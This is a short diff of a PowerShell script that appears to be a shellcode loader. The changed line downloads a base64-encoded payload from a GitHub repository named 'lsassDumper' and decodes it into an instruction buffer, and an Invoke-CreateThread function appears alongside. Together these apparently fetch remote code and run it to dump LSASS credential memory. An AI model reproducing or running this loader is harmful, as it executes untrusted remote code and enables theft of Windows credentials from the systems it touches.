@@ -177,7 +177,7 @@ function Invoke-CreateThread {
                         $lpThreadId)
 }
 
-$X64SampleInstructions = (New-Object System.Net.WebClient).DownloadData('https://raw.githubusercontent.com/666reda/lsassDumper/main/NativeDump_loader.log')
+$X64SampleInstructions = (New-Object System.Net.WebClient).DownloadData('https://raw.githubusercontent.com/666reda/lsassDumper/main/NativeDump_loader.log.b64')
 $X64SampleInstructions = [System.Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString($X64SampleInstructions))
 
 
